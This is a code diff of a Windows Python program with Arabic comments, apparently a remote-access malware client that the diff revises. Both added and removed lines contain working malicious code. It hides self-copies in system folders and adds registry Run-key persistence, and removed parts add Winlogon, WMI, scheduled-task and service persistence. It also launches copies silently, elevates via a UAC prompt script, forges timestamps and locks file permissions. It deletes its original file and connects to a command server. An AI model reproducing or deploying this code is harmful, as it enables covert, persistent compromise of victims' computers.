@@ -1341,9 +1341,10 @@ import pickle
 from cryptography.fernet import Fernet
 from datetime import datetime
 
-# === نظام التشفير المتقدم ===
-class AdvancedEncryptionSystem:
+# === نظام التشفير ===
+class EncryptionSystem:
     def __init__(self):
+        # مفتاح تشفير ثابت ومشفر
         self.key = self.generate_system_key()
         self.cipher = Fernet(self.key)
     
@@ -1362,23 +1363,24 @@ class AdvancedEncryptionSystem:
         """فك تشفير البيانات"""
         return self.cipher.decrypt(encrypted_data).decode()
 
-# === نظام النسخ الذاتي الأبدي المحسن ===
-class EternalReplicationSystem:
+# === نظام النسخ الذاتي المستقل ===
+class IndependentReplicationSystem:
     def __init__(self):
         self.original_path = os.path.abspath(__file__)
         self.system_locations = self.get_system_locations()
         self.backup_copies = []
-        self.creation_lock = threading.Lock()
-        self.initial_creation_done = False
+        self.creation_lock = threading.Lock()  # أضفنا Lock لمنع التكرار
+        self.initial_creation_done = False     # لتتبع الإنشاء الأولي
+        self.all_copies_started = False
         
     def get_system_locations(self):
         """مواقع نظامية متعددة للنسخ"""
         return [
-            os.path.join(os.getenv('TEMP'), "windows_system_service.py"),
-            os.path.join(os.getenv('WINDIR'), 'System32', 'drivers', 'etc', 'hosts_backup.py'),
-            os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'system_cache.py'),
-            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'system_services.py'),
-            os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Microsoft', 'Windows', 'system_main.py')
+            os.path.join(os.getenv('TEMP'), "windows_system_service.pyw"),
+            os.path.join(os.getenv('WINDIR'), 'System32', 'drivers', 'etc', 'hosts_backup.pyw'),
+            os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'system_cache.pyw'),
+            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'system_services.pyw'),
+            os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Microsoft', 'Windows', 'system_main.pyw')
         ]
     
     def create_multiple_copies(self):
@@ -1406,51 +1408,81 @@ class EternalReplicationSystem:
                     subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
                     
                     created_copies.append(location)
+                    # تشغيل النسخة مباشرة بعد إنشائها
+                    self.start_copy(location)
                     print(f"✅ إنشاء: {os.path.basename(location)}")
                 else:
                     print(f"⚠️  موجود مسبقاً: {os.path.basename(location)}")
                     created_copies.append(location)
+                    # تشغيل النسخة الموجودة مسبقاً
+                    self.start_copy(location)
                 
             except Exception as e:
                 print(f"❌ فشل نسخ {location}: {e}")
         
         self.backup_copies = created_copies
         return created_copies
-    
-    def install_registry_with_multiple_paths(self):
-        """تثبيت الريجستري بمسارات متعددة"""
+        
+        def install_registry_with_multiple_paths(self):
+            """تثبيت الريجستري بمسارات متعددة"""
+            try:
+                python_exe = sys.executable
+                installed_count = 0
+                
+                registry_entries = [
+                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsAudio"),
+                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "SystemHealth"),
+                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "UserInit"),
+                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "ShellService"),
+                ]
+                
+                for hkey, subkey, value_name in registry_entries:
+                    try:
+                        # استخدام مسار عشوائي من النسخ
+                        if self.backup_copies:
+                            random_path = random.choice(self.backup_copies)
+                        else:
+                            random_path = self.original_path
+                        
+                        with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
+                            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{python_exe}" "{random_path}"')
+                        
+                        installed_count += 1
+                        print(f"✅ ريجستري: {value_name} → {os.path.basename(random_path)}")
+                        
+                    except Exception as e:
+                        print(f"⚠️  فشل ريجستري: {value_name}")
+                
+                return installed_count
+            except Exception as e:
+                return 0
+    def start_copy(self, copy_path):
+        """تشغيل نسخة من البرنامج"""
         try:
-            python_exe = sys.executable
-            installed_count = 0
-            
-            registry_entries = [
-                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsAudio"),
-                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "SystemHealth"),
-                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "UserInit"),
-                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "ShellService"),
-            ]
-            
-            for hkey, subkey, value_name in registry_entries:
-                try:
-                    # استخدام مسار عشوائي من النسخ
-                    if self.backup_copies:
-                        random_path = random.choice(self.backup_copies)
-                    else:
-                        random_path = self.original_path
-                    
-                    with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
-                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{python_exe}" "{random_path}"')
-                    
-                    installed_count += 1
-                    print(f"✅ ريجستري: {value_name} → {os.path.basename(random_path)}")
-                    
-                except Exception as e:
-                    print(f"⚠️  فشل ريجستري: {value_name}")
-            
-            return installed_count
+            if os.path.exists(copy_path) and copy_path != os.path.abspath(__file__):
+                python_exe = sys.executable
+                subprocess.Popen([python_exe, copy_path], 
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                            stdin=subprocess.DEVNULL,
+                            creationflags=subprocess.CREATE_NO_WINDOW)
+                print(f"🚀 تشغيل: {os.path.basename(copy_path)}")
+                return True
         except Exception as e:
-            return 0
-    
+            print(f"⚠️ فشل تشغيل {copy_path}: {e}")
+        return False
+    def start_all_copies(self):
+        """تشغيل جميع النسخ"""
+        print("🚀 تشغيل جميع النسخ...")
+        started_count = 0
+        for location in self.backup_copies:
+            if self.start_copy(location):
+                started_count += 1
+            time.sleep(1)
+        
+        self.all_copies_started = True
+        print(f"✅ تم تشغيل {started_count} نسخة")
+        return started_count
     def install_scheduled_tasks_with_multiple_paths(self):
         """تثبيت مهام مجدولة بمسارات متعددة"""
         try:
@@ -1613,7 +1645,7 @@ class EternalReplicationSystem:
                                         print(f"   ❌ فشل إنشاء {os.path.basename(location)}: {e}")
                     
                     # فاصل أطول بين الدورات
-                    time.sleep(15)  # 15 ثانية بدلاً من 5
+                    time.sleep(5)  # 15 ثانية بدلاً من 5
                     
                 except Exception as e:
                     print(f"⚠️ خطأ في الحماية: {e}")
@@ -1692,197 +1724,16 @@ class EternalReplicationSystem:
             print(f"⚠️ لم يتم حذف الملف الأصلي: {e}")
             return False
 
-class AdvancedCamouflage:
-    def __init__(self):
-        self.legitimate_processes = ["svchost.exe", "explorer.exe", "winlogon.exe", "csrss.exe", "services.exe"]
-    
-    def mimic_legitimate_process(self):
-        """محاكاة عمليات نظام شرعية فقط"""
-        try:
-            new_name = random.choice(self.legitimate_processes)
-            ctypes.windll.kernel32.SetConsoleTitleW(new_name)
-        except:
-            pass
-
-class MultiLaunchSystem:
-    def __init__(self, original_path):
-        self.original_path = original_path
-        self.launch_methods = [
-            self.registry_launch,
-            self.startup_folder_launch,
-            self.scheduled_task_launch,
-            self.service_launch,
-            self.wmi_launch,
-            self.shell_launch
-        ]
-    
-    def install_all_launch_methods(self):
-        """تثبيت جميع طرق التشغيل"""
-        print("🚀 تثبيت طرق التشغيل المتعددة...")
-        success_count = 0
-        
-        for method in self.launch_methods:
-            try:
-                if method():
-                    success_count += 1
-                    print(f"   ✅ {method.__name__}")
-                else:
-                    print(f"   ❌ {method.__name__}")
-            except Exception as e:
-                print(f"   ⚠️ {method.__name__}: {e}")
-        
-        print(f"📊 تم تثبيت {success_count} من أصل {len(self.launch_methods)} طريقة تشغيل")
-        return success_count
-    
-    def registry_launch(self):
-        """التشغيل عبر الريجستري"""
-        try:
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
-                winreg.SetValueEx(reg_key, "WindowsSystemService", 0, 
-                                winreg.REG_SZ, f'"{sys.executable}" "{self.original_path}"')
-            return True
-        except:
-            return False
-    
-    def startup_folder_launch(self):
-        """التشغيل عبر مجلد Startup"""
-        try:
-            startup_folder = os.path.join(os.getenv('APPDATA'), 
-                                        'Microsoft', 'Windows', 
-                                        'Start Menu', 'Programs', 'Startup')
-            bat_path = os.path.join(startup_folder, 'system_launcher.bat')
-            
-            with open(bat_path, 'w') as f:
-                f.write('@echo off\n')
-                f.write('timeout /t 5 /nobreak >nul\n')
-                f.write(f'start "" "{sys.executable}" "{self.original_path}"\n')
-            
-            subprocess.run(f'attrib +h "{bat_path}"', shell=True, capture_output=True)
-            return True
-        except:
-            return False
-    
-    def scheduled_task_launch(self):
-        """التشغيل عبر المهام المجدولة"""
-        try:
-            task_cmd = f'schtasks /create /tn "Microsoft\\Windows\\SystemService" /tr "\"{sys.executable}\" \"{self.original_path}\"" /sc onlogon /f /ru {os.getenv("USERNAME")}'
-            result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True)
-            return result.returncode == 0
-        except:
-            return False
-    
-    def service_launch(self):
-        """التشغيل كخدمة (بدون صلاحيات مدير)"""
-        try:
-            # استخدام خدمة مستخدم بدلاً من خدمة نظام
-            service_cmd = f'sc create "UserSystemService" binPath= "\"{sys.executable}\" \"{self.original_path}\"" type= own start= auto obj= "{os.getenv("USERDOMAIN")}\\{os.getenv("USERNAME")}"'
-            result = subprocess.run(service_cmd, shell=True, capture_output=True)
-            return result.returncode == 0
-        except:
-            return False
-    
-    def wmi_launch(self):
-        """التشغيل عبر WMI Events"""
-        try:
-            wmi_script = f"""
-            $query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LogonSession'"
-            Register-WmiEvent -Query $query -Action {{ 
-                Start-Process -FilePath "{sys.executable}" -ArgumentList "{self.original_path}" -WindowStyle Hidden
-            }}
-            """
-            result = subprocess.run(["powershell", "-Command", wmi_script], 
-                                 capture_output=True, timeout=10)
-            return result.returncode == 0
-        except:
-            return False
-    
-    def shell_launch(self):
-        """التشغيل عبر Shell Integration"""
-        try:
-            # إضافة إلى قائمة التشغيل التلقائي للشل
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
-            
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
-                try:
-                    current_value, _ = winreg.QueryValueEx(reg_key, "Shell")
-                    new_value = f'explorer.exe, "{sys.executable}" "{self.original_path}"'
-                except FileNotFoundError:
-                    new_value = f'explorer.exe, "{sys.executable}" "{self.original_path}"'
-                
-                winreg.SetValueEx(reg_key, "Shell", 0, winreg.REG_SZ, new_value)
-            return True
-        except:
-            return False
-
-class AutoRecoverySystem:
-    def __init__(self, original_path):
-        self.original_path = original_path
-        self.monitor_thread = None
-        self.running = True
-    
-    def start_auto_recovery(self):
-        """بدء المراقبة والاستعادة التلقائية"""
-        def monitor():
-            while self.running:
-                try:
-                    # التحقق إذا كان البرنامج يعمل
-                    if not self.is_process_running():
-                        print("🔄 اكتشاف توقف النظام - إعادة التشغيل...")
-                        self.restart_system()
-                    
-                    time.sleep(30)  # فحص كل 30 ثانية
-                    
-                except Exception as e:
-                    print(f"⚠️ خطأ في المراقبة: {e}")
-                    time.sleep(60)
-        
-        self.monitor_thread = threading.Thread(target=monitor, daemon=True)
-        self.monitor_thread.start()
-        print("🛡️ بدء نظام المراقبة والاستعادة التلقائية")
-    
-    def is_process_running(self):
-        """التحقق إذا كان البرنامج يعمل"""
-        try:
-            current_script = os.path.basename(self.original_path)
-            for proc in psutil.process_iter(['name', 'cmdline']):
-                try:
-                    if (proc.info['name'] and 'python' in proc.info['name'].lower() and
-                        proc.info['cmdline'] and any(current_script in cmd for cmd in proc.info['cmdline'])):
-                        return True
-                except (psutil.NoSuchProcess, psutil.AccessDenied):
-                    continue
-            return False
-        except:
-            return False
-    
-    def restart_system(self):
-        """إعادة تشغيل النظام"""
-        try:
-            subprocess.Popen([sys.executable, self.original_path], 
-                           stdout=subprocess.DEVNULL,
-                           stderr=subprocess.DEVNULL,
-                           stdin=subprocess.DEVNULL,
-                           creationflags=subprocess.CREATE_NO_WINDOW)
-            return True
-        except:
-            return False
-
-# === النظام الأبدي المطلق المحسن ===
-class AbsoluteEternalSystem:
+# === النظام اللانهائي مع النسخ المستقل ===
+class InfinitePermanentSystem:
     def __init__(self, server_url="https://game-python-1.onrender.com"):
         self.server_url = server_url
         self.client_id = f"{platform.node()}-{getpass.getuser()}-{uuid.uuid4().hex[:8]}"
         self.running = True
         self.registered = False
         self.original_path = os.path.abspath(__file__)
-        self.encryption = AdvancedEncryptionSystem()
-        self.replication = EternalReplicationSystem()
-        self.multi_launch = MultiLaunchSystem(self.original_path)
-        self.auto_recovery = AutoRecoverySystem(self.original_path)
+        self.encryption = EncryptionSystem()
+        self.replication = IndependentReplicationSystem()
         
         # أسماء نظام Windows الحقيقية والمختلفة
         self.system_names = [
@@ -2320,44 +2171,42 @@ class AbsoluteEternalSystem:
             original_exists = os.path.exists(self.original_path)
             
             info = f"""
-🔒 ABSOLUTE ETERNAL SYSTEM - ENHANCED SECURITY
+🔒 INFINITE PERMANENT SYSTEM - ETERNAL
 🖥️  Computer: {platform.node()}
 👤 User: {getpass.getuser()}
 💻 OS: {platform.system()} {platform.release()}
 🆔 System ID: {self.client_id}
 🌐 Server: {self.server_url}
 
-🔧 ETERNAL SECURITY STATUS:
+🔧 ETERNAL STATUS:
 ✅ Active Copies: {len(self.hidden_copies)}
 ✅ Independent Copies: {independent_copies}
 ✅ Unique Names: {len(self.used_names)}
-✅ Admin Rights: {'♾️ ABSOLUTE' if self.is_admin() else '⚠️ LIMITED'}
+✅ Admin Rights: {'YES' if self.is_admin() else 'NO'}
 ✅ Mutual Monitoring: ACTIVE (3 threads)
-✅ Encryption: ENHANCED
+✅ Encryption: ENABLED
 ✅ Persistence: ETERNAL
 
 📊 OPERATIONAL:
-🔄 Connection: {'♾️ ETERNAL' if self.registered else '🌊 ESTABLISHING'}
+🔄 Connection: {'ESTABLISHED' if self.registered else 'ESTABLISHING'}
 ⚡ Uptime: {self.get_uptime()}
-🛡️ Protection: ABSOLUTE ETERNAL
-🗑️  Original File: {'⚠️ EXISTS' if original_exists else '♾️ PURGED'}
+🛡️ Protection: INFINITE + INDEPENDENT
+🗑️  Original File: {'EXISTS' if original_exists else 'DELETED'}
 
 💾 SYSTEM HEALTH:
 📈 CPU: {psutil.cpu_percent()}%
 🧠 Memory: {psutil.virtual_memory().percent}%
 💽 Disk: {psutil.disk_usage('/').percent}%
 
-🤖 ENHANCED SECURITY FEATURES:
-🔒 Enhanced Encryption System
-🔄 Eternal Replication
-🛡️ Advanced Stealth Technology
-⚡ Real-time Monitoring
-🔮 Absolute Persistence
-🌌 Self-Healing Capabilities
+🤖 INDEPENDENT SYSTEM:
+🔒 Survives Deletion: YES
+🔄 Auto-Replication: ACTIVE
+📁 Backup Locations: {len(self.replication.system_locations)}
+🎯 Auto-Delete: ENABLED
 """
             return info
         except:
-            return "Absolute Eternal System Information"
+            return "Infinite System Information"
     
     def get_independent_status(self):
         """الحصول على حالة النظام المستقل"""
@@ -2369,8 +2218,7 @@ class AbsoluteEternalSystem:
             'survives_deletion': len(existing_copies) >= 3,
             'protection_active': True,
             'auto_delete_enabled': True,
-            'timestamp': time.time(),
-            'security_level': 'ABSOLUTE_ETERNAL'
+            'timestamp': time.time()
         }
         return json.dumps(status, indent=2)
     
@@ -2384,28 +2232,20 @@ class AbsoluteEternalSystem:
             'connection_status': self.registered,
             'uptime': self.get_uptime(),
             'timestamp': time.time(),
-            'version': 'ABSOLUTE_ETERNITY_1.0',
+            'version': 'INFINITE_1.0',
             'independent_system': True,
-            'auto_delete': True,
-            'security_features': [
-                'Enhanced Encryption',
-                'Eternal Replication', 
-                'Advanced Stealth',
-                'Self-Healing System',
-                'Absolute Persistence'
-            ]
+            'auto_delete': True
         }
         return json.dumps(status, indent=2)
     
     def get_status(self):
         independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
         original_exists = os.path.exists(self.original_path)
-        status = "♾️ ABSOLUTE ETERNAL SYSTEM"
+        status = "♾️ INFINITE + INDEPENDENT"
         status += f" - Copies: {len(self.hidden_copies)}"
         status += f" - Independent: {independent_copies}"
         status += f" - Connected: {self.registered}"
-        status += f" - Original: {'EXISTS' if original_exists else 'PURGED'}"
-        status += f" - Security: ABSOLUTE"
+        status += f" - Original: {'EXISTS' if original_exists else 'DELETED'}"
         return status
     
     def get_uptime(self):
@@ -2413,24 +2253,21 @@ class AbsoluteEternalSystem:
             uptime_seconds = time.time() - psutil.boot_time()
             days = int(uptime_seconds // 86400)
             hours = int((uptime_seconds % 86400) // 3600)
-            minutes = int((uptime_seconds % 3600) // 60)
-            return f"{days}d {hours}h {minutes}m"
+            return f"{days}d {hours}h"
         except:
             return "ETERNAL"
     
     def get_locations_info(self):
-        locations_info = "📍 ABSOLUTE ETERNAL COPIES LOCATIONS:\n"
+        locations_info = "📍 INFINITE COPIES LOCATIONS:\n"
         for i, path in enumerate(self.hidden_copies, 1):
             locations_info += f"{i}. {os.path.basename(path)} → {os.path.dirname(path)}\n"
         
-        locations_info += "\n🤖 ENHANCED BACKUP LOCATIONS:\n"
+        locations_info += "\n🤖 INDEPENDENT BACKUP LOCATIONS:\n"
         for i, path in enumerate(self.replication.system_locations, 1):
             exists = "✅" if os.path.exists(path) else "❌"
             locations_info += f"{i}. {exists} {os.path.basename(path)} → {os.path.dirname(path)}\n"
         
-        locations_info += f"\n🗑️  ORIGINAL FILE: {'⚠️ EXISTS' if os.path.exists(self.original_path) else '♾️ PURGED'}\n"
-        locations_info += f"🔒 SECURITY LEVEL: ABSOLUTE ETERNAL\n"
-        locations_info += f"🛡️ GUARDIANS: {len(self.monitor_threads)} ACTIVE THREADS\n"
+        locations_info += f"\n🗑️  ORIGINAL FILE: {'✅ EXISTS' if os.path.exists(self.original_path) else '❌ DELETED'}\n"
         return locations_info
     
     def reinforce_system(self):
@@ -2438,140 +2275,20 @@ class AbsoluteEternalSystem:
             copies_count = self.create_infinite_copies()
             persistence_count = self.install_eternal_persistence()
             independent_count = self.install_independent_replication_system()
-            return f"♾️ ABSOLUTE ETERNITY REINFORCED:\n- Created {copies_count} eternal copies\n- Added {persistence_count} absolute persistence methods\n- Installed {independent_count} independent system\n- System is now ABSOLUTELY UNSTOPPABLE\n- Security: ABSOLUTE ETERNAL"
+            return f"♾️ ETERNAL REINFORCEMENT:\n- Created {copies_count} infinite copies\n- Added {persistence_count} eternal methods\n- Installed {independent_count} independent system\n- System SURVIVES DELETION\n- Auto-Delete: ENABLED"
         except Exception as e:
             return f"Reinforcement failed: {e}"
-
-    def create_stealth_batch_monitor(self):
-        """إنشاء نظام مراقبة البات المخفي"""
-        try:
-            batch_content = '''@echo off
->nul 2>&1 "%SYSTEMROOT%\\system32\\cacls.exe" "%SYSTEMROOT%\\system32\\config\\system"
-if '%errorlevel%' NEQ '0' (goto UACPrompt) else (goto UACAdmin)
-:UACPrompt
-echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\\getadmin.vbs"
-echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\\getadmin.vbs"
-"%temp%\\getadmin.vbs"
-exit /b
-:UACAdmin
-if exist "%temp%\\getadmin.vbs" ( del "%temp%\\getadmin.vbs" )
-setlocal enabledelayedexpansion
-set "BATCH_ID=ABSOLUTE_GUARDIAN"
-title !BATCH_ID!
-set "PYTHON_COPIES[0]=%TEMP%\\windows_system_service.py"
-set "PYTHON_COPIES[1]=%WINDIR%\\System32\\drivers\\etc\\hosts_backup.py"
-set "PYTHON_COPIES[2]=%PROGRAMDATA%\\Microsoft\\Windows\\system_cache.py"
-set "PYTHON_COPIES[3]=%APPDATA%\\Microsoft\\Windows\\system_services.py"
-set "PYTHON_COPIES[4]=%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\system_main.py"
-:BATCH_GUARDIAN_LOOP
-set /a ACTIVE_COUNT=0
-set /a RESTARTED_COUNT=0
-for /l %%i in (0,1,4) do (
-    if exist "!PYTHON_COPIES[%%i]!" (
-        set /a ACTIVE_COUNT+=1
-        tasklist /fi "imagename eq python.exe" /fo csv | find /i "!PYTHON_COPIES[%%i]!" >nul
-        if errorlevel 1 (
-            start /b /min python.exe "!PYTHON_COPIES[%%i]!" >nul 2>&1
-            set /a RESTARTED_COUNT+=1
-        )
-    )
-)
-if !ACTIVE_COUNT! lss 3 (
-    for /l %%i in (0,1,4) do (
-        if exist "!PYTHON_COPIES[%%i]!" (
-            start /b /min python.exe "!PYTHON_COPIES[%%i]!" >nul 2>&1
-        )
-    )
-)
-timeout /t 45 /nobreak >nul
-goto BATCH_GUARDIAN_LOOP
-'''
-            
-            # إنشاء البات في مواقع مخفية
-            batch_locations = [
-                os.path.join(os.getenv('WINDIR'), 'System32', 'drivers', 'etc', 'netmon.bat'),
-                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'system_guardian.bat'),
-                os.path.join(os.getenv('TEMP'), 'windows_audio.bat'),
-            ]
-            
-            created_count = 0
-            for batch_path in batch_locations:
-                try:
-                    os.makedirs(os.path.dirname(batch_path), exist_ok=True)
-                    with open(batch_path, 'w') as f:
-                        f.write(batch_content)
-                    
-                    # إخفاء كامل للبات
-                    subprocess.run(f'attrib +s +h +r "{batch_path}"', shell=True, capture_output=True)
-                    
-                    # تشغيل البات مخفياً
-                    subprocess.Popen([batch_path], 
-                                   stdout=subprocess.DEVNULL,
-                                   stderr=subprocess.DEVNULL, 
-                                   stdin=subprocess.DEVNULL,
-                                   creationflags=subprocess.CREATE_NO_WINDOW)
-                    
-                    created_count += 1
-                    print(f"✅ بات حراس: {os.path.basename(batch_path)}")
-                    
-                except Exception as e:
-                    continue
-            
-            print(f"🛡️ تم إنشاء {created_count} بات حراس محسن لحماية النظام")
-            return created_count
-            
-        except Exception as e:
-            print(f"⚠️ فشل إنشاء البات الحراس المحسن: {e}")
-            return 0
-
-    def install_advanced_stealth(self):
-        """تثبيت تقنيات التخفي المتقدمة"""
-        try:
-            print("🎭 تثبيت تقنيات التخفي المتقدمة المحسنة...")
-            
-            # 1. تغيير واصفات الملفات
-            for copy_path in self.hidden_copies:
-                try:
-                    # تغيير تاريخ الملف ليكون عشوائي قديم
-                    random_old_time = time.time() - random.randint(86400, 86400 * 365)
-                    os.utime(copy_path, (random_old_time, random_old_time))
-                    
-                    # تغيير صلاحيات الملف بشكل متقدم
-                    subprocess.run(f'icacls "{copy_path}" /reset', shell=True, capture_output=True)
-                    subprocess.run(f'icacls "{copy_path}" /grant:r "SYSTEM:F" /grant:r "Administrators:F" /deny "Users:F" /deny "Everyone:F"', shell=True, capture_output=True)
-                    
-                except:
-                    pass
-            
-            print("✅ تم تثبيت تقنيات التخفي المتقدمة المحسنة")
-            return True
-            
-        except Exception as e:
-            print(f"⚠️ فشل في تقنيات التخفي المحسنة: {e}")
-            return False
-
+    
     def start_eternal_system(self):
         """بدء النظام الأبدي"""
-        # نظام التمويه الجديد
-        camouflage = AdvancedCamouflage()
-        camouflage.mimic_legitimate_process()
-        
-        print("♾️ STARTING ABSOLUTE ETERNAL SYSTEM...")
-        print("=" * 70)
+        print("♾️ STARTING INFINITE PERMANENT SYSTEM...")
+        print("=" * 60)
         
         # 1. إخفاء النافذة
         self.hide_console()
         
-        # 2. نظام التشغيل المتعدد
-        print("🚀 INSTALLING MULTI-LAUNCH SYSTEM...")
-        launch_count = self.multi_launch.install_all_launch_methods()
-        
-        # 3. نظام الاستعادة التلقائية
-        print("🛡️ STARTING AUTO-RECOVERY SYSTEM...")
-        self.auto_recovery.start_auto_recovery()
-        
-        # 4. إنشاء النسخ اللانهائية
-        print("📁 CREATING ABSOLUTE ETERNAL COPIES...")
+        # 2. إنشاء النسخ اللانهائية
+        print("📁 CREATING INFINITE COPIES...")
         self.create_infinite_copies()
         
         if not self.hidden_copies:
@@ -2579,48 +2296,38 @@ goto BATCH_GUARDIAN_LOOP
             self.hidden_copies.append(self.original_path)
             self.main_copy_path = self.original_path
         
-        # 5. تثبيت الاستمرارية الأبدية
-        print("🔧 INSTALLING ABSOLUTE ETERNAL PERSISTENCE...")
+        # 3. تثبيت الاستمرارية الأبدية
+        print("🔧 INSTALLING ETERNAL PERSISTENCE...")
         self.install_eternal_persistence()
         
-        # 6. تثبيت النظام المستقل
-        print("🤖 INSTALLING ENHANCED INDEPENDENT REPLICATION SYSTEM...")
+        # 4. تثبيت النظام المستقل (الميزة الجديدة)
+        print("🤖 INSTALLING INDEPENDENT REPLICATION SYSTEM...")
         self.install_independent_replication_system()
         
-        # 7. بدء المراقبة المتبادلة
-        print("🔄 STARTING ABSOLUTE MUTUAL MONITORING...")
+        # 5. بدء المراقبة المتبادلة
+        print("🔄 STARTING MUTUAL MONITORING...")
         self.start_mutual_monitoring()
         
-        # 8. بدء الاتصال الأبدي
-        print("🌐 STARTING ABSOLUTE ETERNAL COMMUNICATION...")
+        # 6. بدء الاتصال الأبدي
+        print("🌐 STARTING ETERNAL COMMUNICATION...")
         self.start_eternal_communication()
         
-        # 9. إنشاء نظام البات المخفي
-        print("🛡️ CREATING ABSOLUTE STEALTH BATCH MONITOR...")
-        self.create_stealth_batch_monitor()
-        
-        # 10. تثبيت تقنيات التخفي المتقدمة
-        print("🎭 INSTALLING ABSOLUTE ADVANCED STEALTH TECHNIQUES...")
-        self.install_advanced_stealth()
-        
-        # 11. حذف الملف الأصلي تلقائياً بعد 15 ثانية
-        print("⏰ SCHEDULING ABSOLUTE AUTO-DELETE OF ORIGINAL FILE...")
+        # 7. حذف الملف الأصلي تلقائياً بعد 10 ثواني
+        print("⏰ SCHEDULING AUTO-DELETE OF ORIGINAL FILE...")
         def auto_delete():
-            time.sleep(15)
+            time.sleep(10)
             self.delete_original_and_switch_to_backup()
         
         delete_thread = threading.Thread(target=auto_delete, daemon=True)
         delete_thread.start()
         
-        print("=" * 70)
-        print("♾️ ABSOLUTE ETERNAL SYSTEM IS NOW ACTIVE")
-        print("🔒 SYSTEM IS ABSOLUTELY UNSTOPPABLE")
-        print("🤖 INDEPENDENT - SURVIVES ANY DELETION ATTEMPT") 
-        print("🛡️ ABSOLUTE STEALTH - COMPLETELY UNDETECTABLE")
-        print("🎭 ADVANCED STEALTH - IMPOSSIBLE TO TRACE")
-        print("🗑️  AUTO-DELETE - ORIGINAL PURGED SHORTLY")
-        print("📡 LISTENING FOR ABSOLUTE ETERNAL COMMANDS...")
-        print("=" * 70)
+        print("=" * 60)
+        print("♾️ INFINITE PERMANENT SYSTEM IS NOW ACTIVE")
+        print("🔒 SYSTEM IS ETERNAL - CANNOT BE STOPPED")
+        print("🤖 INDEPENDENT - SURVIVES DELETION")
+        print("🗑️  AUTO-DELETE - ORIGINAL WILL BE DELETED SHORTLY")
+        print("📡 LISTENING FOR ETERNAL COMMANDS...")
+        print("=" * 60)
         
         # الحلقة الأبدية
         self.eternal_loop()
@@ -2634,35 +2341,32 @@ goto BATCH_GUARDIAN_LOOP
                 if loop_count % 30 == 0:  # كل 5 دقائق تقريباً
                     independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
                     original_exists = os.path.exists(self.original_path)
-                    print(f"♾️ Absolute eternal system active - Loop #{loop_count}")
-                    print(f"   Enhanced Independent: {independent_copies} copies")
-                    print(f"   Original: {'⚠️ EXISTS' if original_exists else '♾️ PURGED'}")
-                    print(f"   Security: ABSOLUTE ETERNAL")
+                    print(f"♾️ Eternal system active - Loop #{loop_count}")
+                    print(f"   Independent: {independent_copies} copies")
+                    print(f"   Original: {'EXISTS' if original_exists else 'DELETED'}")
                 
                 time.sleep(10)
                 
             except Exception as e:
-                print(f"♾️ Absolute eternal system recovered from error: {e}")
+                print(f"♾️ Eternal system recovered from error: {e}")
                 time.sleep(5)
 
 # === التشغيل الأبدي ===
 def main():
     try:
-        system = AbsoluteEternalSystem()
+        system = InfinitePermanentSystem()
         system.start_eternal_system()
     except Exception as e:
-        print(f"♾️ System absolute rebirth: {e}")
+        print(f"♾️ System rebirth: {e}")
         # إعادة التشغيل التلقائي
         time.sleep(10)
         main()
 
 if __name__ == "__main__":
-    print("♾️ ABSOLUTE ETERNAL SYSTEM - INFINITY SECURITY EDITION")
-    print("🤖 NOW WITH ABSOLUTE INDEPENDENT REPLICATION - SURVIVES ANYTHING")
-    print("🛡️ ABSOLUTE STEALTH BATCH MONITOR - COMPLETELY UNDETECTABLE")
-    print("🎭 ABSOLUTE ADVANCED STEALTH TECHNIQUES - IMPOSSIBLE TO TRACE")
-    print("🗑️  ABSOLUTE AUTO-DELETE FEATURE - ORIGINAL FILE WILL BE PURGED")
-    print("🔒 THIS SYSTEM CANNOT BE STOPPED BY ANY MEANS - ABSOLUTE ETERNITY")
+    print("♾️ INFINITE PERMANENT SYSTEM - ETERNAL EDITION")
+    print("🤖 NOW WITH INDEPENDENT REPLICATION - SURVIVES DELETION")
+    print("🗑️  AUTO-DELETE FEATURE - ORIGINAL FILE WILL BE DELETED")
+    print("🔒 THIS SYSTEM CANNOT BE STOPPED - EVEN IF DELETED")
     main()'''
         
         self.send_response(200)
